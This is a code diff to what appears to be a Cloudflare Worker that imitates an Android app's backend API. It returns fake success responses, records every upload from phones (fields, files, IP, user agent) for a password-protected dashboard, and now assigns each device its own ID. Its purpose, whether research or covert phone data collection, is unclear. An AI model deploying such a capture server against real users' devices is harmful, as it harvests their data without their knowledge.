@@ -15,6 +15,41 @@ var PASS_HASH = "86f1672bb6586732adac9bc70e357457bfe50c1dd20cdcbcf82476f6a0d0a3d
 var SESSION_DAYS = 30;
 var APK_UA = "ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019";
 
+// Per-device system: har phone ko activation pe UNIQUE idPhone milta hai.
+// Phone har request mein apna idPhone bhejta hai -> dashboard alag-alag dikhata hai.
+var deviceSeq = 0; // next idPhone to assign
+var deviceNames = {}; // idPhone -> setup mein diya gaya phone naam
+var namesLoaded = false;
+
+async function loadNames() {
+  if (namesLoaded) return;
+  namesLoaded = true;
+  if (typeof KV_DATA === "undefined" || !KV_DATA) return;
+  try {
+    var raw = await KV_DATA.get("dev:names");
+    if (raw) {
+      deviceNames = JSON.parse(raw) || {};
+      var mx = 0;
+      for (var id in deviceNames) {
+        var n = parseInt(id, 10);
+        if (n > mx) mx = n;
+      }
+      deviceSeq = mx;
+    }
+  } catch (e) {
+    // KV fail -> in-memory only
+  }
+}
+
+async function saveNames() {
+  if (typeof KV_DATA === "undefined" || !KV_DATA) return;
+  try {
+    await KV_DATA.put("dev:names", JSON.stringify(deviceNames));
+  } catch (e) {
+    // ignore
+  }
+}
+
 addEventListener("fetch", function (event) {
   event.respondWith(handle(event.request));
 });
@@ -213,11 +248,39 @@ async function handle(request) {
     var p = url.pathname;
     var capPromise = capturePost(request, url);
 
-    return capPromise.then(function () {
-      if (p === "/user/loginUser.php") return jsonResp({ status: "ok", idClient: 1 });
-      if (p === "/user/verifPhone.php") return jsonResp({ status: "ok", nbPhone: 0 });
-      if (p === "/user/savePhone.php") return jsonResp({ status: "ok", idPhone: 1 });
-      if (p === "/user/getLastVersionApp.php") return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
+    return capPromise.then(async function (cap) {
+      var f = (cap && cap.fields) || {};
+
+      if (p === "/user/loginUser.php") {
+        return jsonResp({ status: "ok", idClient: 1 });
+      }
+      if (p === "/user/verifPhone.php") {
+        // Naam pehle se kisi aur device ne liya hai to nbPhone:1 -> app naam ke aage _1 lagayegi
+        await loadNames();
+        var wantName = String(f.namePhone || "");
+        var exists = 0;
+        if (wantName !== "") {
+          for (var id in deviceNames) {
+            if (String(deviceNames[id]) === wantName) {
+              exists = 1;
+              break;
+            }
+          }
+        }
+        return jsonResp({ status: "ok", nbPhone: exists });
+      }
+      if (p === "/user/savePhone.php") {
+        // NAYA device -> unique idPhone assign karo (2 phone = 2 alag ID, data mix nahi hoga)
+        await loadNames();
+        deviceSeq = deviceSeq + 1;
+        var newId = deviceSeq;
+        deviceNames[String(newId)] = String(f.namePhone || "") || "Device-" + newId;
+        await saveNames();
+        return jsonResp({ status: "ok", idPhone: newId });
+      }
+      if (p === "/user/getLastVersionApp.php") {
+        return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
+      }
       return new Response("ok", {
         status: 200,
         headers: Object.assign({ "content-type": "text/plain; charset=utf-8" }, corsHeaders()),
@@ -247,6 +310,7 @@ async function handle(request) {
 
 /* ---------- capture ---------- */
 async function capturePost(request, url) {
+  await loadNames();
   var fields = {};
   var files = [];
   var bodyPreview = "";
@@ -303,6 +367,14 @@ async function capturePost(request, url) {
     bodyPreview = "[parse error] " + String(e);
   }
 
+  var deviceId = null;
+  var deviceName = null;
+  var fid = fields.idPhone;
+  if (fid !== undefined && fid !== null && fid !== "") {
+    deviceId = String(fid);
+    deviceName = deviceNames[deviceId] || null;
+  }
+
   var cap = {
     id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
     time: new Date().toISOString(),
@@ -313,6 +385,8 @@ async function capturePost(request, url) {
     body: bodyPreview,
     ip: request.headers.get("cf-connecting-ip") || "",
     ua: request.headers.get("user-agent") || "",
+    deviceId: deviceId,
+    deviceName: deviceName,
   };
 
   captures.unshift(cap);
